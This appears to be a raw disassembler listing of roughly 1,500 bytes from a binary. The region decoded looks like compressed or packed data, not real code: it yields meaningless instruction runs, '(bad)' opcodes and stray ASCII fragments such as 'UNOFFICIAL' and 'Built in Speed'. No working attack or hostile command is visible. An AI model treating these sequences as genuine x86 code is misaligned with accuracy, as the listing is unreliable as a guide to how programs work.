  418163:	9a 73 63 64 6b c9 93 	lcall  $0x93c9,$0x6b646373
  41816a:	2c 2a                	sub    $0x2a,%al
  41816c:	cc                   	int3
  41816d:	05 d3 93 34 58       	add    $0x583493d3,%eax
  418172:	02 ad fc 20 f8 c9    	add    -0x3607df04(%ebp),%ch
  418178:	49                   	dec    %ecx
  418179:	4a                   	dec    %edx
  41817a:	20 c5                	and    %al,%ch
  41817c:	31 cc                	xor    %ecx,%esp
  41817e:	70 38                	jo     0x4181b8
  418180:	81 5b a5 44 ff 5a ac 	sbbl   $0xac5aff44,-0x5b(%ebx)
  418187:	63 f0                	arpl   %esi,%eax
  418189:	c8 a0 18 06          	enter  $0x18a0,$0x6
  41818d:	53                   	push   %ebx
  41818e:	25 09 a1 24 62       	and    $0x6224a109,%eax
  418193:	99                   	cltd
  418194:	18 d3                	sbb    %dl,%bl
  418196:	8b 41 72             	mov    0x72(%ecx),%eax
  418199:	72 c9                	jb     0x418164
  41819b:	ac                   	lods   %ds:(%esi),%al
  41819c:	cc                   	int3
  41819d:	48                   	dec    %eax
  41819e:	b8 43 88 a6 e4       	mov    $0xe4a68843,%eax
  4181a3:	b3 cc                	mov    $0xcc,%bl
  4181a5:	48                   	dec    %eax
  4181a6:	57                   	push   %edi
  4181a7:	87 c0                	xchg   %eax,%eax
  4181a9:	fd                   	std
  4181aa:	97                   	xchg   %eax,%edi
  4181ab:	08 64 65 78          	or     %ah,0x78(%ebp,%eiz,2)
  4181af:	74 6f                	je     0x418220
  4181b1:	72 33                	jb     0x4181e6
  4181b3:	32 0a                	xor    (%edx),%cl
  4181b5:	27                   	daa
  4181b6:	db e0                	fneni(8087 only)
  4181b8:	db 9f 3e 61 72 20    	fistpl 0x2072613e(%edi)
  4181be:	57                   	push   %edi
  4181bf:	03 73 20             	add    0x20(%ebx),%esi
  4181c2:	45                   	inc    %ebp
  4181c3:	70 f0                	jo     0x4181b5
  4181c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4181c6:	22 fd                	and    %ch,%bh
  4181c8:	06                   	push   %es
  4181c9:	a2 7f 20 32 20       	mov    %al,0x2032207f
  4181ce:	2d 20 41 74 40       	sub    $0x40744120,%eax
  4181d3:	20 4f 66             	and    %cl,0x66(%edi)
  4181d6:	20 54 68 c5          	and    %dl,-0x3b(%eax,%ebp,2)
  4181da:	df 96 b8 11 43 6c    	fists  0x6c4311b8(%esi)
  4181e0:	70 65                	jo     0x418247
  4181e2:	20 46 75             	and    %al,0x75(%esi)
  4181e5:	6c                   	insb   (%dx),%es:(%edi)
  4181e6:	6c                   	insb   (%dx),%es:(%edi)
  4181e7:	20 44 6d b7          	and    %al,-0x49(%ebp,%ebp,2)
  4181eb:	ad                   	lods   %ds:(%esi),%eax
  4181ec:	55                   	push   %ebp
  4181ed:	81 0e 61 27 72 2e    	orl    $0x2e722761,(%esi)
  4181f3:	4d                   	dec    %ebp
  4181f4:	65 b5 f6             	gs mov $0xf6,%ch
  4181f7:	df 9c 47 2e 4a 65 6e 	fistps 0x6e654a2e(%edi,%eax,2)
  4181fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4181ff:	61                   	popa
  418200:	20 4a 61             	and    %cl,0x61(%edx)
  418203:	6d                   	insl   (%dx),%es:(%edi)
  418204:	28 2c 60             	sub    %ch,(%eax,%eiz,2)
  418207:	7f 6b                	jg     0x418274
  418209:	df 41 42             	filds  0x42(%ecx)
  41820c:	75 69                	jne    0x418277
  41820e:	6c                   	insb   (%dx),%es:(%edi)
  41820f:	74 32                	je     0x418243
  418211:	6e                   	outsb  %ds:(%esi),(%dx)
  418212:	20 53 70             	and    %dl,0x70(%ebx)
  418215:	65 65 64 37          	gs gs fs aaa
  418219:	6d                   	insl   (%dx),%es:(%edi)
  41821a:	ed                   	in     (%dx),%eax
  41821b:	df 4c 2c 5b          	fisttps 0x5b(%esp,%ebp,1)
  41821f:	44                   	inc    %esp
  418220:	69 56 58 5d 20 4c 28 	imul   $0x284c205d,0x58(%esi),%edx
  418227:	23 6f 0b             	and    0xb(%edi),%ebp
  41822a:	cc                   	int3
  41822b:	10 9c 6e 52 b8 6d 25 	adc    %bl,0x256db852(%esi,%ebp,2)
  418232:	da 25 67 37 3f 48    	fisubl 0x483f3767
  418238:	b9 a3 36 76 6b       	mov    $0x6b7636a3,%ecx
  41823d:	ed                   	in     (%dx),%eax
  41823e:	20 50 6f             	and    %dl,0x6f(%eax)
  418241:	af                   	scas   %es:(%edi),%eax
  418242:	22 b5 6e 64 40 53    	and    0x5340646e(%ebp),%dh
  418248:	4c                   	dec    %esp
  418249:	c0 5c 73 db 63       	rcrb   $0x63,-0x25(%ebx,%esi,2)
  41824e:	0e                   	push   %cs
  41824f:	6f                   	outsl  %ds:(%esi),(%dx)
  418250:	d3 dd                	rcr    %cl,%ebp
  418252:	b9 4a 5e ab cd       	mov    $0xcdab5e4a,%ecx
  418257:	97                   	xchg   %eax,%edi
  418258:	47                   	inc    %edi
  418259:	46                   	inc    %esi
  41825a:	43                   	inc    %ebx
  41825b:	4b                   	dec    %ebx
  41825c:	1b ae db b6 b6 dd    	sbb    -0x22494925(%esi),%ebp
  418262:	b8 20 4d 4b 67       	mov    $0x674b4d20,%eax
  418267:	1d c4 57 39 6c       	sbb    $0x6c3957c4,%eax
  41826c:	48                   	dec    %eax
  41826d:	db ae 8b 6d 49 4c    	fldt   0x4c496d8b(%esi)
  418273:	75 00                	jne    0x418275
  418275:	69 f8 41 6c 05 6e    	imul   $0x6e056c41,%eax,%edi
  41827b:	df 15 c2 7f 16 6b    	fists  0x6b167fc2
  418281:	73 68                	jae    0x4182eb
  418283:	6f                   	outsl  %ds:(%esi),(%dx)
  418284:	70 07                	jo     0x41828d
  418286:	25 4f 61 30 f7       	and    $0xf730614f,%eax
  41828b:	16                   	push   %ss
  41828c:	84 74 3d 37          	test   %dh,0x37(%ebp,%edi,1)
  418290:	43                   	inc    %ebx
  418291:	68 69 48 c8 7d       	push   $0x7dc84869
  418296:	44                   	inc    %esp
  418297:	f0 2d 2f 21 da 31    	lock sub $0x31da212f,%eax
  41829d:	83 2d b4 b6 7c 6f bf 	subl   $0xffffffbf,0x6f7cb6b4
  4182a4:	21 7d 63             	and    %edi,0x63(%ebp)
  4182a7:	2b 77 bb             	sub    -0x45(%edi),%esi
  4182aa:	ed                   	in     (%dx),%eax
  4182ab:	b0 92                	mov    $0x92,%al
  4182ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4182ae:	2b d7                	sub    %edi,%edx
  4182b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4182b1:	eb 6c                	jmp    0x41831f
  4182b3:	61                   	popa
  4182b4:	ef                   	out    %eax,(%dx)
  4182b5:	13 51 6b             	adc    0x6b(%ecx),%edx
  4182b8:	04 98                	add    $0x98,%al
  4182ba:	8f                   	(bad)
  4182bb:	20 62 39             	and    %ah,0x39(%edx)
  4182be:	80 86 10 9e 64 2d 2b 	addb   $0x2b,0x2d649e10(%esi)
  4182c5:	18 0d 86 85 66 2f    	sbb    %cl,0x2f668586
  4182cb:	19 17                	sbb    %edx,(%edi)
  4182cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4182ce:	2b d2                	sub    %edx,%edx
  4182d0:	57                   	push   %edi
  4182d1:	3b b0 b6 d1 65 62    	cmp    0x6265d1b6(%eax),%esi
  4182d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4182d8:	74 d4                	je     0x4182ae
  4182da:	23 22                	and    (%edx),%esp
  4182dc:	b7 a2                	mov    $0xa2,%bh
  4182de:	0d 7f b9 41 49       	or     $0x4941b97f,%eax
  4182e3:	4d                   	dec    %ebp
  4182e4:	63 63 6f             	arpl   %esp,0x6f(%ebx)
  4182e7:	75 6e                	jne    0x418357
  4182e9:	74 35                	je     0x418320
  4182eb:	65 61                	gs popa
  4182ed:	76 33                	jbe    0x418322
  4182ef:	81 15 a7 e3 23 4d 53 	adcl   $0xe1864e53,0x4d23e3a7
  4182f6:	4e 86 e1 
  4182f9:	1d b6 8a b2 77       	sbb    $0x77b28ab6,%eax
  4182fe:	b4 55                	mov    $0x55,%ah
  418300:	7b ef                	jnp    0x4182f1
  418302:	12 66 a6             	adc    -0x5a(%esi),%ah
  418305:	61                   	popa
  418306:	37                   	aaa
  418307:	5f                   	pop    %edi
  418308:	1b 7b 6b             	sbb    0x6b(%ebx),%edi
  41830b:	5b                   	pop    %ebx
  41830c:	67 70 1e             	addr16 jo 0x41832d
  41830f:	cf                   	iret
  418310:	7f 6f                	jg     0x418381
  418312:	d9 43 03             	flds   0x3(%ebx)
  418315:	1f                   	pop    %ds
  418316:	6d                   	insl   (%dx),%es:(%edi)
  418317:	cd 64                	int    $0x64
  418319:	6f                   	outsl  %ds:(%esi),(%dx)
  41831a:	63 b9 23 1e 57 20    	arpl   %edi,0x20571e23(%ecx)
  418320:	64 77 85             	fs ja  0x4182a8
  418323:	70 a1                	jo     0x4182c6
  418325:	6a 2f                	push   $0x2f
  418327:	58                   	pop    %eax
  418328:	50                   	push   %eax
  418329:	5b                   	pop    %ebx
  41832a:	28 77 da             	sub    %dh,-0x26(%edi)
  41832d:	d6                   	salc
  41832e:	28 b4 4b d5 60 ef 61 	sub    %dh,0x61ef60d5(%ebx,%ecx,2)
  418335:	27                   	daa
  418336:	19 6f 54             	sbb    %ebp,0x54(%edi)
  418339:	80 32 ac             	xorb   $0xac,(%edx)
  41833c:	35 2e 30 27 38       	xor    $0x3827302e,%eax
  418341:	0a 37                	or     (%edi),%dh
  418343:	07                   	pop    %es
  418344:	16                   	push   %ss
  418345:	44                   	inc    %esp
  418346:	53                   	push   %ebx
  418347:	4c                   	dec    %esp
  418348:	d8 d6                	fcom   %st(6)
  41834a:	60                   	pusha
  41834b:	0e                   	push   %cs
  41834c:	ec                   	in     (%dx),%al
  41834d:	2f                   	das
  41834e:	de 55 6e             	ficoms 0x6e(%ebp)
  418351:	63 61 70             	arpl   %esp,0x70(%ecx)
  418354:	70 53                	jo     0x4183a9
  418356:	27                   	daa
  418357:	ee                   	out    %al,(%dx)
  418358:	de 86 a3 e6 39 23    	fiadds 0x2339e6a3(%esi)
  41835e:	74 c0                	je     0x418320
  418360:	9f                   	lahf
  418361:	6d                   	insl   (%dx),%es:(%edi)
  418362:	70 75                	jo     0x4183d9
  418364:	ac                   	lods   %ds:(%esi),%al
  418365:	70 98                	jo     0x4182ff
  418367:	e1 0f                	loope  0x418378
  418369:	b3 97                	mov    $0x97,%bl
  41836b:	68 cf 7f eb 68       	push   $0x68eb7fcf
  418370:	06                   	push   %es
  418371:	26 5a                	es pop %edx
  418373:	50                   	push   %eax
  418374:	41                   	inc    %ecx
  418375:	7c 72                	jl     0x4183e9
  418377:	6d                   	insl   (%dx),%es:(%edi)
  418378:	20 46 69             	and    %al,0x69(%esi)
  41837b:	72 c0                	jb     0x41833d
  41837d:	4c                   	dec    %esp
  41837e:	61                   	popa
  41837f:	e6 65                	out    %al,$0x65
  418381:	77 61                	ja     0x4183e4
  418383:	b3 22                	mov    $0x22,%bl
  418385:	e1 47                	loope  0x4183ce
  418387:	ce                   	into
  418388:	20 b2 20 20 36 20    	and    %dh,0x20362020(%edx)
  41838e:	4b                   	dec    %ebx
  41838f:	65 be 65 26 47 63    	gs mov $0x63472665,%esi
  418395:	47                   	inc    %edi
  418396:	4e                   	dec    %esi
  418397:	68 8b 2b 74 6b       	push   $0x6b742b8b
  41839c:	b4 c3                	mov    $0xc3,%ah
  41839e:	20 df                	and    %bl,%bh
  4183a0:	a0 cc ac 76 69       	mov    0x6976accc,%al
  4183a5:	14 a4                	adc    $0xa4,%al
  4183a7:	81 ec 84 d7 2c b7    	sub    $0xb72cd784,%esp
  4183ad:	06                   	push   %es
  4183ae:	29 d2                	sub    %edx,%edx
  4183b0:	e9 b6 ad 9f b2       	jmp    0xb2e1316b
  4183b5:	2d a5 73 81 c5       	sub    $0xc58173a5,%eax
  4183ba:	38 37                	cmp    %dh,(%edi)
  4183bc:	1c e5                	sbb    $0xe5,%al
  4183be:	9f                   	lahf
  4183bf:	81 ac 75 15 6d 92 27 	subl   $0xb261681a,0x27926d15(%ebp,%esi,2)
  4183c6:	1a 68 61 b2 
  4183ca:	95                   	xchg   %eax,%ebp
  4183cb:	99                   	cltd
  4183cc:	0a b7 0c 25 4b 40    	or     0x404b250c(%edi),%dh
  4183d2:	e6 0c                	out    %al,$0xc
  4183d4:	ed                   	in     (%dx),%eax
  4183d5:	47                   	inc    %edi
  4183d6:	d9 8b c6 4b db 6a    	(bad) 0x6adb4bc6(%ebx)
  4183dc:	fc                   	cld
  4183dd:	8f                   	(bad)
  4183de:	2f                   	das
  4183df:	41                   	inc    %ecx
  4183e0:	69 6b 61 51 75 73 aa 	imul   $0xaa737551,0x61(%ebx),%ebp
  4183e7:	48                   	dec    %eax
  4183e8:	f8                   	clc
  4183e9:	0d 1b 60 5b a5       	or     $0xa55b601b,%eax
  4183ee:	69 2e 77 85 5b 2b    	imul   $0x2b5b8577,(%esi),%ebp
  4183f4:	8d                   	lea    (bad),%edi
  4183f5:	fe                   	(bad)
  4183f6:	7a 39                	jp     0x418431
  4183f8:	a0 d2 6c 73 9d       	mov    0x9d736cd2,%al
  4183fd:	ce                   	into
  4183fe:	08 c9                	or     %cl,%cl
  418400:	68 34 52 83 19       	push   $0x19835234
  418405:	b5 42                	mov    $0x42,%ch
  418407:	e1 d6                	loope  0x4183df
  418409:	c2 1e 65             	ret    $0x651e
  41840c:	2d 2e 80 4f ad       	sub    $0xad4f802e,%eax
  418411:	57                   	push   %edi
  418412:	4a                   	dec    %edx
  418413:	9a 22 57 50 be 25 b0 	lcall  $0xb025,$0xbe505722
  41841a:	b1 5c                	mov    $0x5c,%cl
  41841c:	0d 4d 2d a0 8d       	or     $0x8da02d4d,%eax
  418421:	b0 8d                	mov    $0x8d,%al
  418423:	f3 eb 17             	repz jmp 0x41843d
  418426:	fb                   	sti
  418427:	53                   	push   %ebx
  418428:	93                   	xchg   %eax,%ebx
  418429:	30 b5 56 f4 1f 42    	xor    %dh,0x421ff456(%ebp)
  41842f:	05 6f 75 4a d6       	add    $0xd64a756f,%eax
  418434:	3e d0 15 28 6e 75 20 	rclb   $1,%ds:0x20756e28
  41843b:	1f                   	pop    %ds
  41843c:	c6 42 a1 bd          	movb   $0xbd,-0x5f(%edx)
  418440:	2d db 2b b2 34       	sub    $0x34b22bdb,%eax
  418445:	2f                   	das
  418446:	06                   	push   %es
  418447:	8c 91 f0 45 54 41    	mov    %ss,0x415445f0(%ecx)
  41844d:	6f                   	outsl  %ds:(%esi),(%dx)
  41844e:	db 6b c8             	fldt   -0x38(%ebx)
  418451:	d9 42 1a             	flds   0x1a(%edx)
  418454:	f9                   	stc
  418455:	67 27                	addr16 daa
  418457:	1f                   	pop    %ds
  418458:	17                   	pop    %ss
  418459:	b2 b6                	mov    $0xb6,%dl
  41845b:	5d                   	pop    %ebp
  41845c:	73 21                	jae    0x41847f
  41845e:	69 d1 2a 27 60 b7    	imul   $0xb760272a,%ecx,%edx
  418464:	4b                   	dec    %ebx
  418465:	cd 0d                	int    $0xd
  418467:	58                   	pop    %eax
  418468:	f2 78 2e             	bnd js 0x418499
  41846b:	2b 66 6f             	sub    0x6f(%esi),%esp
  41846e:	c3                   	ret
  41846f:	b6 00                	mov    $0x0,%dh
  418471:	75 20                	jne    0x418493
  418473:	db c1                	fcmovnb %st(1),%st
  418475:	58                   	pop    %eax
  418476:	53                   	push   %ebx
  418477:	a1 d5 0e 07 0e       	mov    0xe070ed5,%eax
  41847c:	9f                   	lahf
  41847d:	8e db                	mov    %ebx,%ds
  41847f:	24 db                	and    $0xdb,%al
  418481:	bb 04 47 16 3f       	mov    $0x3f164704,%ebx
  418486:	26 cf                	es iret
  418488:	55                   	push   %ebp
  418489:	74 ff                	je     0x41848a
  41848b:	09 7b b4             	or     %edi,-0x4c(%ebx)
  41848e:	6c                   	insb   (%dx),%es:(%edi)
  41848f:	c2 f5 93             	ret    $0x93f5
  418492:	20 28                	and    %ch,(%eax)
  418494:	57                   	push   %edi
  418495:	4f                   	dec    %edi
  418496:	52                   	push   %edx
  418497:	4b                   	dec    %ebx
  418498:	53                   	push   %ebx
  418499:	21 d6                	and    %edx,%esi
  41849b:	b5 77                	mov    $0x77,%ch
  41849d:	d9 21                	fldenv (%ecx)
  41849f:	29 2f                	sub    %ebp,(%edi)
  4184a1:	2a 9b f5 45 66 2d    	sub    0x2d6645f5(%ebx),%bl
  4184a7:	24 64                	and    $0x64,%al
  4184a9:	cb                   	lret
  4184aa:	b6 4d                	mov    $0x4d,%dh
  4184ac:	62 3a                	bound  %edi,(%edx)
  4184ae:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4184af:	58                   	pop    %eax
  4184b0:	e0 36                	loopne 0x4184e8
  4184b2:	d9 cf                	fxch   %st(7)
  4184b4:	48                   	dec    %eax
  4184b5:	1a 66 2d             	sbb    0x2d(%esi),%ah
  4184b8:	37                   	aaa
  4184b9:	66 0f 02 d8          	lar    %ax,%bx
  4184bd:	56                   	push   %esi
  4184be:	17                   	pop    %ss
  4184bf:	53                   	push   %ebx
  4184c0:	4e                   	dec    %esi
  4184c1:	fa                   	cli
  4184c2:	7f 63                	jg     0x418527
  4184c4:	92                   	xchg   %eax,%edx
  4184c5:	e7 90                	out    %eax,$0x90
  4184c7:	22 77 65             	and    0x65(%edi),%dh
  4184ca:	64 6f                	outsl  %fs:(%esi),(%dx)
  4184cc:	0b 3c 61             	or     (%ecx,%eiz,2),%edi
  4184cf:	00 17                	add    %dl,(%edi)
  4184d1:	23 7a 69             	and    0x69(%edx),%edi
  4184d4:	7f 38                	jg     0x41850e
  4184d6:	6c                   	insb   (%dx),%es:(%edi)
  4184d7:	b2 60                	mov    $0x60,%dl
  4184d9:	4d                   	dec    %ebp
  4184da:	f5                   	cmc
  4184db:	2b 7e 4b             	sub    0x4b(%esi),%edi
  4184de:	12 1f                	adc    (%edi),%bl
  4184e0:	ac                   	lods   %ds:(%esi),%al
  4184e1:	39 b2 ee 72 4d 2b    	cmp    %esi,0x2b4d72ee(%edx)
  4184e7:	f3 2d 4b e8 97 f0    	repz sub $0xf097e84b,%eax
  4184ed:	e4 26                	in     $0x26,%al
  4184ef:	66 03 ba 77 75 76 21 	add    0x21767577(%edx),%di
  4184f6:	50                   	push   %eax
  4184f7:	32 45 f1             	xor    -0xf(%ebp),%al
  4184fa:	47                   	inc    %edi
  4184fb:	18 ec                	sbb    %ch,%ah
  4184fd:	db 42 be             	fildl  -0x42(%edx)
  418500:	fb                   	sti
  418501:	23 c7                	and    %edi,%eax
  418503:	4c                   	dec    %esp
  418504:	49                   	dec    %ecx
  418505:	4e                   	dec    %esi
  418506:	45                   	inc    %ebp
  418507:	cb                   	lret
  418508:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  418509:	b0 65                	mov    $0x65,%al
  41850b:	81 f3 2a 5d e3 eb    	xor    $0xebe35d2a,%ebx
  418511:	24 eb                	and    $0xeb,%al
  418513:	47                   	inc    %edi
  418514:	72 15                	jb     0x41852b
  418516:	74 9f                	je     0x4184b7
  418518:	5a                   	pop    %edx
  418519:	61                   	popa
  41851a:	ac                   	lods   %ds:(%esi),%al
  41851b:	81 dd b5 75 1e 5f    	sbb    $0x5f1e75b5,%ebp
  418521:	43                   	inc    %ebx
  418522:	44                   	inc    %esp
  418523:	31 b9 f7 2f 24 2c    	xor    %edi,0x2c242ff7(%ecx)
  418529:	e4 2b                	in     $0x2b,%al
  41852b:	af                   	scas   %es:(%edi),%eax
  41852c:	c3                   	ret
  41852d:	84 05 1a b4 70 1b    	test   %al,0x1b70b41a
  418533:	a9 54 73 b4 85       	test   $0x85b47354,%eax
  418538:	d9 3f                	fnstcw (%edi)
  41853a:	df ef                	fucomip %st(7),%st
  41853c:	27                   	daa
  41853d:	61                   	popa
  41853e:	5a                   	pop    %edx
  41853f:	61                   	popa
  418540:	41                   	inc    %ecx
  418541:	20 34 48             	and    %dh,(%eax,%ecx,2)
  418544:	fe                   	(bad)
  418545:	37                   	aaa
  418546:	6c                   	insb   (%dx),%es:(%edi)
  418547:	db 73 6b             	(bad) 0x6b(%ebx)
  41854a:	2e 70 e2             	jo,pn  0x41852f
  41854d:	32 39                	xor    (%ecx),%bh
  41854f:	55                   	push   %ebp
  418550:	4e                   	dec    %esi
  418551:	4f                   	dec    %edi
  418552:	46                   	inc    %esi
  418553:	46                   	inc    %esi
  418554:	49                   	dec    %ecx
  418555:	43                   	inc    %ebx
  418556:	49                   	dec    %ecx
  418557:	41                   	inc    %ecx
  418558:	4c                   	dec    %esp
  418559:	b1 60                	mov    $0x60,%cl
  41855b:	be c9 2f 3f 63       	mov    $0x633f2fc9,%esi
  418560:	69 7f 66 c2 83 c2 90 	imul   $0x90c283c2,0x66(%edi),%edi
  418567:	12 2c 22             	adc    (%edx,%eiz,1),%ch
  41856a:	f6 30                	divb   (%eax)
  41856c:	c3                   	ret
  41856d:	92                   	xchg   %eax,%edx
  41856e:	b5 2d                	mov    $0x2d,%ch
  418570:	31 4c 50 26          	xor    %ecx,0x26(%eax,%edx,2)
  418574:	76 91                	jbe    0x418507
  418576:	90                   	nop
  418577:	c9                   	leave
  418578:	1a 2d 47 23 34 ac    	sbb    0xac342347,%ch
  41857e:	cd 96                	int    $0x96
  418580:	d1 d5                	rcl    $1,%ebp
  418582:	31 da                	xor    %ebx,%edx
  418584:	e0 5a                	loopne 0x4185e0
  418586:	0c 86                	or     $0x86,%al
  418588:	1b 90 25 fc 7a b3    	sbb    -0x4c8503db(%eax),%edx
  41858e:	20 2f                	and    %ch,(%edi)
  418590:	7c 79                	jl     0x41860b
  418592:	20 63 50             	and    %ah,0x50(%ebx)
  418595:	ff 10                	call   *(%eax)
  418597:	8a 15 33 47 f9 89    	mov    0x89f94733,%dl
  41859d:	99                   	cltd
  41859e:	24 a2                	and    $0xa2,%al
  4185a0:	36 0d 26 30 a2 50    	ss or  $0x50a23026,%eax
  4185a6:	2c 15                	sub    $0x15,%al
  4185a8:	c6                   	(bad)
  4185a9:	f7 39                	idivl  (%ecx)
  4185ab:	8a 51 95             	mov    -0x6b(%ecx),%dl
  4185ae:	04 f3                	add    $0xf3,%al
  4185b0:	75 79                	jne    0x41862b
  4185b2:	02 bd 05 36 95 07    	add    0x7953605(%ebp),%bh
  4185b8:	39 20                	cmp    %esp,(%eax)
  4185ba:	d6                   	salc
  4185bb:	08 90 29 06 68 1e    	or     %dl,0x1e680629(%eax)
  4185c1:	99                   	cltd
  4185c2:	77 b3                	ja     0x418577
  4185c4:	d8 b1 45 e8 8d 27    	fdivs  0x278de845(%ecx)
  4185ca:	11 10                	adc    %edx,(%eax)
  4185cc:	5f                   	pop    %edi
  4185cd:	6c                   	insb   (%dx),%es:(%edi)
  4185ce:	8b f2                	mov    %edx,%esi
  4185d0:	0b ee                	or     %esi,%ebp
  4185d2:	22 6a b9             	and    -0x47(%edx),%ch
  4185d5:	34 d6                	xor    $0xd6,%al
  4185d7:	f4                   	hlt
  4185d8:	26 a0 20 f4 9a 4b    	mov    %es:0x4b9af420,%al
  4185de:	11 2a                	adc    %ebp,(%edx)
  4185e0:	1f                   	pop    %ds
  4185e1:	f5                   	cmc
  4185e2:	af                   	scas   %es:(%edi),%eax
  4185e3:	06                   	push   %es
  4185e4:	56                   	push   %esi
  4185e5:	71 ed                	jno    0x4185d4
  4185e7:	db 9f 50 38 2a 62    	fistpl 0x622a3850(%edi)
  4185ed:	87 23                	xchg   %esp,(%ebx)
  4185ef:	64 53                	fs push %ebx
  4185f1:	c1 33 2d             	shll   $0x2d,(%ebx)
  4185f4:	07                   	pop    %es
  4185f5:	b0 75                	mov    $0x75,%al
  4185f7:	d7                   	xlat   %ds:(%ebx)
  4185f8:	7b dd                	jnp    0x4185d7
  4185fa:	a1 bf 17 bc c7       	mov    0xc7bc17bf,%eax
  4185ff:	05 50 a3 2d b8       	add    $0xb82da350,%eax
  418604:	93                   	xchg   %eax,%ebx
  418605:	13 1d eb fe bc 18    	adc    0x18bcfeeb,%ebx
  41860b:	34 8b                	xor    $0x8b,%al
  41860d:	15 88 84 15 bb       	adc    $0xbb158488,%eax
  418612:	33 ff                	xor    %edi,%edi
  418614:	20 81 3d 1c 6d 28    	and    %al,0x286d1c3d(%ecx)
  41861a:	f7 05 f5 27 37 a0 c0 	testl  $0xe65d07c0,0xa03727f5
  418621:	07 5d e6 
  418624:	dc ae c6 8e be 32    	fsubrl 0x32be8ec6(%esi)
  41862a:	dc 44 8d 5d          	faddl  0x5d(%ebp,%ecx,4)
  41862e:	ab                   	stos   %eax,%es:(%edi)
  41862f:	f7 ef                	imul   %edi
  418631:	67 96                	addr16 xchg %eax,%esi
  418633:	c5 ac ff b5 0a e0 6f 	lds    0x6fe00ab5(%edi,%edi,8),%ebp
  41863a:	a1 04 70 bb 7f       	mov    0x7fbb7004,%eax
  41863f:	1e                   	push   %ds
  418640:	ff 34 85 c4 36 b8 54 	push   0x54b836c4(,%eax,4)
  418647:	0b 85 ad d9 d5 9b    	or     -0x642a2653(%ebp),%eax
  41864d:	a1 0e e9 5d 54       	mov    0x545de90e,%eax
  418652:	63 79 3b             	arpl   %edi,0x3b(%ecx)
  418655:	f5                   	cmc
  418656:	64 7b 0e             	fs jnp 0x418667
  418659:	db b0 3d a2 17 0f    	(bad) 0xf17a23d(%eax)
  41865f:	d6                   	salc
  418660:	ea 64 2f 41 dd 0a 3f 	ljmp   $0x3f0a,$0xdd412f64
  418667:	18 84 0c 85 43 6e 4f 	sbb    %al,0x4f6e4385(%esp,%ecx,1)
  41866e:	42                   	inc    %edx
  41866f:	14 6a                	adc    $0x6a,%al
  418671:	be f4 01 c8 4d       	mov    $0x4dc801f4,%esi
  418676:	d9 65 27             	fldenv 0x27(%ebp)
  418679:	7b b9                	jnp    0x418634
  41867b:	1e                   	push   %ds
  41867c:	3e 44                	ds inc %esp
  41867e:	0a a8 cf 60 55 bc    	or     -0x43aa9f31(%eax),%ch
  418684:	d5 ff                	aad    $0xff
  418686:	81 0f 85 4f ec 6a    	orl    $0x6aec4f85,(%edi)
  41868c:	25 3c 37 7c a7       	and    $0xa77c373c,%eax
  418691:	bd 54 41 68 3c       	mov    $0x3c684154,%ebp
  418696:	ac                   	lods   %ds:(%esi),%al
  418697:	17                   	pop    %ss
  418698:	54                   	push   %esp
  418699:	65 21 57 17          	and    %edx,%gs:0x17(%edi)
  41869d:	bc 1b 8a 51 ba       	mov    $0xba518a1b,%esp
  4186a2:	80 a1 4c bc f0 6c e3 	andb   $0xe3,0x6cf0bc4c(%ecx)
  4186a9:	60                   	pusha
  4186aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4186ab:	ba d0 e6 0e bc       	mov    $0xbc0ee6d0,%edx
  4186b0:	38 0e                	cmp    %cl,(%esi)
  4186b2:	ff 1b                	lcall  *(%ebx)
  4186b4:	59                   	pop    %ecx
  4186b5:	af                   	scas   %es:(%edi),%eax
  4186b6:	a2 9d 00 8a 0c       	mov    %al,0xc8a009d
  4186bb:	1a 9b c6 61 40 30    	sbb    0x304061c6(%ebx),%bl
  4186c1:	5c                   	pop    %esp
  4186c2:	50                   	push   %eax
  4186c3:	4d                   	dec    %ebp
  4186c4:	d6                   	salc
  4186c5:	01 41 a1             	add    %eax,-0x5f(%ecx)
  4186c8:	d2 70 82             	shlb   %cl,-0x7e(%eax)
  4186cb:	e7 73                	out    %eax,$0x73
  4186cd:	60                   	pusha
  4186ce:	82 8a 4a d9 a0 5f 05 	orb    $0x5,0x5fa0d94a(%edx)
  4186d5:	c8 0b 39 01          	enter  $0x390b,$0x1
  4186d9:	30 d8                	xor    %bl,%al
  4186db:	c2 5e 4a             	ret    $0x4a5e
  4186de:	c8 1c 85 7a          	enter  $0x851c,$0x7a
  4186e2:	61                   	popa
  4186e3:	61                   	popa
  4186e4:	5c                   	pop    %esp
  4186e5:	57                   	push   %edi
  4186e6:	03 12                	add    (%edx),%edx
  4186e8:	d0 87 51 a4 ee 22    	rolb   $1,0x22eea451(%edi)
  4186ee:	04 e4                	add    $0xe4,%al
  4186f0:	14 d9                	adc    $0xd9,%al
  4186f2:	b9 07 ba 28 d9       	mov    $0xd928ba07,%ecx
  4186f7:	e1 19                	loope  0x418712
  4186f9:	33 80 35 f6 5e 60    	xor    0x605ef635(%eax),%eax
  4186ff:	f5                   	cmc
  418700:	51                   	push   %ecx
  418701:	4c                   	dec    %esp
  418702:	08 27                	or     %ah,(%edi)
  418704:	7e 64                	jle    0x41876a
  418706:	f1                   	int1
  418707:	6a 2c                	push   $0x2c
  418709:	84 3f                	test   %bh,(%edi)
  41870b:	c1 c8 f0             	ror    $0xf0,%eax
  41870e:	75 f0                	jne    0x418700
  418710:	68 38 d9 ed 07       	push   $0x7edd938
  418715:	09 12                	or     %edx,(%edx)
  418717:	12 71 b8             	adc    -0x48(%ecx),%dh
  41871a:	8d 55 90             	lea    -0x70(%ebp),%edx
  41871d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41871e:	0f 57 60 7e          	xorps  0x7e(%eax),%xmm4
  418722:	64 4b                	fs dec %ebx
  418724:	ec                   	in     (%dx),%al
  418725:	15 bb 93 10 9b       	adc    $0x9b1093bb,%eax
  41872a:	75 a9                	jne    0x4186d5
  41872c:	0f c6 34 84 64       	shufps $0x64,(%esp,%eax,4),%xmm6
  418731:	e4 61                	in     $0x61,%al
  418733:	ae                   	scas   %es:(%edi),%al
  418734:	1b d9                	sbb    %ecx,%ebx
  418736:	04 c2                	add    $0xc2,%al
  418738:	3b bc 64 f3 19 9f df 	cmp    -0x2060e60d(%esp,%eiz,2),%edi
